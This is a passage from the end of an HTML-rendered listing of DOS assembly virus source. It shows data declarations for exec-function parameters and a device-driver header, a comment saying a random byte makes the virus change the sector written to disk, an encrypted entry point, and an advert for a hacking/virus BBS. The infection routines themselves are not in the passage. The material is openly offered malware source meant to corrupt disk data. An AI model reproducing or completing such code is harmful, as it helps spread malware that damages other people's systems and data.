                        </span><span class="sc1">; this virus</span><span class="sc0">

</span><span class="sc5">Param</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; parameters for the</span><span class="sc0">
                        </span><span class="sc1">; exec-function</span><span class="sc0">

</span><span class="sc5">Random</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; if this byte becomes zero</span><span class="sc0">
                        </span><span class="sc1">; the virus will change the</span><span class="sc0">
                        </span><span class="sc1">; sector that will be written</span><span class="sc0">
                        </span><span class="sc1">; to disk</span><span class="sc0">

</span><span class="sc5">Header</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; this is the header for the</span><span class="sc0">
                        </span><span class="sc1">; device driver</span><span class="sc0">

</span><span class="sc5">Filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Buffer for the filename used</span><span class="sc0">
                        </span><span class="sc1">; by the exec-function</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; The End                                                                     ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">                   </span><span class="sc1">; end of the viral code</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Encrypt</span><span class="sc0">                 </span><span class="sc1">; start at offset 100h for</span><span class="sc0">
                        </span><span class="sc1">; com-file</span><span class="sc0">

</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  &gt; and Remember Don't Forget to Call &lt;</span><span class="sc0">
</span><span class="sc1">;  &gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span></div></body>
</html>
